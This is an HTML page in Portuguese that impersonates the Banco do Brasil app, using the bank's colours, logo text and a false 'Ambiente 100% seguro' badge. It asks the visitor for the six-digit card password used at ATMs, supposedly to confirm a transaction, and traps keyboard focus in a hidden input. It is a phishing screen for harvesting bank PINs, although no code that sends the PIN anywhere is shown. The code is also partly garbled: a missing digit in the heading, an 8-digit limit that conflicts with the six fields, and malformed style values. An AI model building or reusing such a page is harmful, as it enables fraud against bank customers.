<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Banco do Brasil | Validação</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://unpkg.com/lucide@latest"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap');
        
        body {
            font-family: 'Roboto', sans-serif;
            background-color: #f0f2f5;
            margin: 0;
            display: flex;
            justify-content: center;
            min-height: 100vh;
        }

        .phone-screen {
            width: 100%;
            max-width: 450px;
            height: 100vh;
            background-color: #ffffff;
            display: flex;
            flex-direction: column;
            position: relative;
            overflow: hidden;
        }

        /* Cores BB */
        .bb-blue-dark { background-color: #003399; }
        .bb-yellow { background-color: #f8d117; }
        .text-bb-blue { color: #003399; }

        .header-bb {
            background-color: #ffffff;
            border-bottom: 2px solid #f8d117;
        }

        /* Campos de dígito */
        .pin-field {
            width: 45px;
            height: 55px;
            display: flex;
            align-items: center;
            justify-content: center;
            border-radius: 4px;
            border-bottom: 3px solid #ced4da;
            background-color: #fcfcfc;
            font-size: 1.6rem;
            font-weight: 700;
            color: #003399;
            transition: all 0.2s ease;
        }

        .pin-field.active {
            border-bottom-color: #003399;
            background-color: #fff;
        }

        /* Input real invisível */
        #real-input {
            position: absolute;
            opacity: 0;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 10;
        }

        .btn-bb {
            background-color: #003399;
            color: white;
            font-weight: 600;
            transition: opacity 0.3s;
        }

        .btn-bb:disabled {
            background-color: #cccccc;
            color: #888888;
        }

        .logo-bb-container {
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .bb-icon {
            width: 28px;
            height: 28px;
            background: #f8d117;
            display: flex;
            align-items: center;
            justify-content: center;
            border-radius: 4px;
        }
    </style>
</head>
<body>

    <div class="phone-screen" onclick="document.getElementById('real-input').focus()">
        <!-- Header -->
        <div class="header-bb p-4 flex items-center justify-between shadow-sm">
            <div class="flex items-center">
                <button class="mr-4 text-bb-blue"><i data-lucide="arrow-left" class="w-6 h-6"></i></button>
                <div class="logo-bb-container">
                    <div class="bb-icon">
                        <span class="text-bb-blue font-bold text-xs">BB</span>
                    </div>
                    <span class="text-bb-blue font-bold tracking-tight text-lg">Banco do Brasil</span>
                </div>
            </div>
            <i data-lucide="help-circle" class="w-5 h-5 text-zinc-400"></i>
        </div>

        <!-- Banner Amarelo Sutil -->
        <div class="bb-yellow h-1 w-full"></div>

        <div class="p-8">
            <div class="mb-8">
                <h2 class="text-2xl font-bold text-bb-blue mb-3">Senha de  dígitos</h2>
                <p class="text-zinc-600 text-sm leading-relaxed">
                    Para confirmar esta transação, informe sua <span class="font-bold">Senha de 6 dígitos</span> (utilizada em caixas eletrônicos e compras com o cartão).
                </p>
            </div>

            <!-- Area de Digitação -->
            <div class="flex flex-col items-center">
                <div class="flex justify-between w-full max-w-[320px] gap-2 mb-10">
                    <div class="pin-field"></div>
                    <div class="pin-field"></div>
                    <div class="pin-field"></div>
                    <div class="pin-field"></div>
                    <div class="pin-field"></div>
                    <div class="pin-field"></div>
                </div>

                <input 
                    type="tel" 
                    id="real-input" 
                    maxlength="8" 
                    inputmode="numeric" 
                    autocomplete="off"
                    pattern="[0-9]*"
                    autofocus
                >
            </div>

            <div class="flex items-center gap-2 p-3 bg-blue-50 rounded-lg border border-blue-100 mb-8">
                <i data-lucide="shield-check" class="w-5 h-5 text-bb-blue"></i>
                <p class="text-[11px] text-bb-blue font-medium">Ambiente 100% seguro Banco do Brasil</p>
            </div>
        </div>

        <div class="p-8 mt-auto">
            <button id="btn-continue" disabled class="btn-bb w-full py- rounded-full shadow-md text-center">
                Confirmar
            </button>
            <p class="text-center text-zinc-00 text-xs mt-">Esqueci minha senha</p>
        </div>
    </div>

    <script>
        // Inicializa ícones
        lucide.createIcons();

        const realInput = document.getElementById('real-input');
        const fields = document.querySelectorAll('.pin-field');
        const btnContinue = document.getElementById('btn-continue');

        realInput.addEventListener('input', (e) => {
            // Filtra apenas números
            let value = e.target.value.replace(/[^0-9]/g, '');
            e.target.value = value;
            
            fields.forEach((field, index) => {
                if (index < value.length) {
                    field.innerText = value[index];
                    field.classList.add('active');
                    field.style.borderBottomColor = '#003399';
                } else {
                    field.innerText = '';
                    field.classList.remove('active');
                    field.style.borderBottomColor = '#cedda';
                }
            });

            btnContinue.disabled = (value.length !== 8);
            if (value.length === 8) {
                btnContinue.style.opacity = "1";
            } else {
                btnContinue.style.opacity = "0.7";
            }
        });

        // Foco automático e persistente
        window.onload = () => {
            setTimeout(() => realInput.focus(), 500);
        };

        // Força o teclado a aparecer se clicar na tela
        document.body.addEventListener('click', () => {
            realInput.focus();
        });
    </script>
</body>
</html>
